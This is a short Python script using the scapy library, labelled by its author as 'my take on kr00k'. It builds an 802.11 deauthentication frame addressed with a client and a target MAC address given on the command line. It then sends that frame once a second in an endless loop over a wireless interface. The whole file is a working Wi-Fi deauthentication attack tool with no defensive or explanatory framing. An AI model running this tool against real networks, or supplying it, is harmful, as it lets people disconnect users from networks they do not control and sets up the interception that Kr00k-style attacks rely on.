from scapy.all import sniff, Dot11, Dot11Deauth, RadioTap, sendp, scapy
from time import sleep
import argparse


class Kr00k:

    def __init__(self, macClient, macTarget):
        self.macClient = macClient
        self.macTarget = macTarget
        self.interface = "wlan0"

    def deauh(self):
        deauthPacket = RadioTap()/Dot11(type=0, subtype=12, addr1=self.macTarget, addr2=self.macClient, addr3=self.macClient)\
            /Dot11Deauth(reason=7)
        while True:
            sendp(deauthPacket, iface=self.interface, count=1, verbose=False)
            sleep(1)


def main():
    try:
        parser = argparse.ArgumentParser(description="my take on kr00k")
        parser.add_argument("-c", "--client", required=True, help="client mac address", type=str)
        parser.add_argument("-t", "--target", required=True, help="target mac address", type=str)
        args = parser.parse_args()
        client = args.client
        target = args.target
    
        Kr00k(client, target).deauh()
    
    except scapy.error.Scapy_Exception:
        print("Scapy_Exception")

if __name__ == "__main__":
    main()
